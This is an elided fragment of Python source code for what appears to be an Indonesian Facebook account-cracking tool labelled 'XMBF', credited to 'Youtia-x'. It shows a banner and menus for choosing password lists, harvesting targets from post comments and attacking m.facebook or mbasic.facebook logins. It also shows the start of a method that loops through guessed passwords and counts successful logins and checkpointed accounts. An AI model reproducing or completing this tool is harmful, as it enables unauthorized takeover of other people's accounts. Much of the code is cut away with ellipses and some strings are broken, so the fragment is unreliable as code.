...
class Logo:
	...
	def logonya(self):
		...
		cetak(nel("""[green]
═╗ ╦╔╦╗╔╗ ╔═╗[white]XMBF VERSION FULL[green]
╔╩╦╝║║║╠╩╗╠╣[white] MADE BY Youtia-x[red]
╩ ╚═╩ ╩╚═╝╚  """))
...
[white][[blue]04[white]] crack dari komentar""",style='purple',title=f'[green]✓ [red]indonesia[green] ✓'))
...
[white][[blue]03[white]] pass + manual [white][[red]dalam tahap[white]]""",title='[green]✓ [blue]Pilih Kompitabel Password [green]✓',style='purple'))
		set = input(f"{P}[{M}?{P}] Pilih Password : ")
		
		cetak(nel("""[[blue]01[white]] m.facebook
[[blue]02[white]] mbasic.facebook""",title='[green]✓ [blue]REGULER [green]✓',style='purple'))
		cetak(nel("""[[blue]03[white]] m.facebook
[[blue]04[white]] mbasic.facebook""",style='purple',title='[green]✓ [blue]VALIDATE[green] ✓'))
	...
	def metode_api(self,user,pwx):
		prog.update(des,description=f"[{H2}•{P2}] {H2}crack{P2} {str(self.loop)}/{len(tampung)} RESULT : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
